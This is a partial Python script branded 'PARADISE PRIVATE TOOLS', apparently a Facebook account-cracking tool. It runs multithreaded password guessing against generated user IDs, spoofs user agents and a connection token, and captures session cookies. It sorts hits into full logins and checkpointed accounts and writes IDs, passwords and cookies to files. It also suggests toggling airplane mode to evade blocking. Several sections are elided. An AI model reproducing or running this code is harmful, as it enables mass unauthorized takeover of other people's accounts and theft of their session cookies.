...
def ____banner____():
    ...
    banner_text = f"""
{THEME_PRIMARY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{THEME_ACCENT}                  PARADISE PRIVATE TOOLS — FINAL BUILD 6.0
{THEME_PRIMARY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

 {THEME_TITLE}● {THEME_ACCENT}VERSION     {RESET}: {THEME_PRIMARY}6.0 FINAL BUILD
...
def old_One():
    ...
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;201m(\x1b[1;37m★\x1b[38;5;201m)\x1b[1;37m>\x1b[38;5;201m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;201m(\x1b[1;37m★\x1b[38;5;201m)\x1b[1;37m>\x1b[38;5;201m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
    ...
    "User-Agent": str(random.choice([
        ...
        "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62"
            ...
            if "session_key" in res:
                ...
                # Ambil cookies lengkap
                session_cookies = res.get("session_cookies", [])
                cookie_dict = {c['name']: c['value'] for c in session_cookies}
                cookie_string = "; ".join([f"{c['name']}={c['value']}" for c in session_cookies])

                # Deteksi status
                is_urep = "c_user" in cookie_dict and "xs" in cookie_dict
                is_softcp = not is_urep
                ...
                if is_softcp:
                    ...
                    print("\033[38;5;51m┌" + "─" * 60 + "┐")
                    print("\033[38;5;51m│\033[38;5;87m              ◇ AQUA MATRIX : SOFT - CP LOGIN ◇              \033[38;5;51m│")
                    print("\033[38;5;51m├" + "─" * 60 + "┤")

                    print(f"│  \033[38;5;87mUID       : \033[97m{uid:<46}\033[38;5;51m│")
                    print(f"│  \033[38;5;87mPASS      : \033[97m{pw:<46}\033[38;5;51m│")
                    print(f"│  \033[38;5;87mSTATUS    : \033[96mSOFT-CP (API OK){' ' * 29}\033[38;5;51m│")
                    print(f"│  \033[38;5;87mCOOKIE    : \033[97m{cookie_string[:46]:<46}\033[38;5;51m│")

                    print("└" + "─" * 60 + "┘\033[0m")

                    # Save file
                    softcp_dir = os.path.join(BASE_DIR, "CP")
                    os.makedirs(softcp_dir, exist_ok=True)
                    with open(os.path.join(softcp_dir, "SOFT_CP.txt"), "a") as f:
                    ...
                    # PANEL REALTIME
                    print(
                        f"\r\033[92mOK: {len(oks)}   "
                        f"\033[96mSOFT-CP: {len(softcps)}   "
                        f"\033[91mCP: {len(cps)}",
                        end=""
                    )
                    continue
                ...
                # ======================================================
                    ...
                    print("\033[38;5;51m┌" + "─" * 60 + "┐")
                    print("\033[38;5;51m│\033[38;5;87m               ★ AQUA MATRIX : LOGIN OK ★                  \033[38;5;51m│")
                    print("\033[38;5;51m├" + "─" * 60 + "┤")

                    print(f"│  \033[38;5;87mUID       : \033[97m{uid:<46}\033[38;5;51m│")
                    print(f"│  \033[38;5;87mPASS      : \033[97m{pw:<46}\033[38;5;51m│")
                    print(f"│  \033[38;5;87mSTATUS    : \033[92mFULL LOGIN (UREP){' ' * 26}\033[38;5;51m│")
                    print(f"│  \033[38;5;87mCOOKIE    : \033[97m{cookie_string[:46]:<46}\033[38;5;51m│")
                    ...
                    with open(os.path.join(ok_dir, "COOKIE.txt"), "a") as f:
            ...
            # ===================== HARD CP =====================
                ...
                print("\n\033[38;5;51m┌" + "─" * 60 + "┐")
                print("\033[38;5;51m│\033[91m              ⚠️  AQUA MATRIX : HARD CHECKPOINT ⚠️            \033[38;5;51m│")
                print("\033[38;5;51m├" + "─" * 60 + "┤")

                print(f"│  \033[38;5;87mUID       : \033[93m{uid:<46}\033[38;5;51m│")
                print(f"│  \033[38;5;87mPASS      : \033[93m{pw:<46}\033[38;5;51m│")
                print(f"│  \033[38;5;87mYEAR      : \033[93m{str(year):<46}\033[38;5;51m│")
                print(f"│  \033[38;5;87mSTATUS    : \033[91mHARD-CP{' ' * 39}\033[38;5;51m│")
                print(f"│  \033[38;5;87mUSER-AG   : \033[93m{ua[:46]:<46}\033[38;5;51m│")
                ...
                # ================= REALTIME PANEL BESAR =================
                total_count = len(oks) + len(softcps) + len(cps)

                print(
                    f"\n\033[38;5;51m┌" + "─" * 52 + "┐\n"
                    f"│ \033[38;5;87mAQUA MATRIX • REAL-TIME STATISTIK\033[38;5;51m{' ' * 5}│\n"
                    f"├" + "─" * 52 + "┤\n"
                    f"│ \033[92mOK       : \033[97m{len(oks):<40}\033[38;5;51m│\n"
                    f"│ \033[93mSOFT-CP  : \033[97m{len(softcps):<40}\033[38;5;51m│\n"
                    f"│ \033[91mHARD-CP  : \033[97m{len(cps):<40}\033[38;5;51m│\n"
                    f"│ \033[96mTOTAL    : \033[97m{total_count:<40}\033[38;5;51m│\n"
                    f"├" + "─" * 52 + "┤\n"
                    f"│ \033[38;5;87mCURRENT UID :\033[97m {uid:<30}\033[38;5;51m│\n"
                    f"│ \033[38;5;87mCURRENT PASS:\033[97m {pw:<30}\033[38;5;51m│\n"
                    f"└" + "─" * 52 + "┘\033[0m",
                    end=""
                )
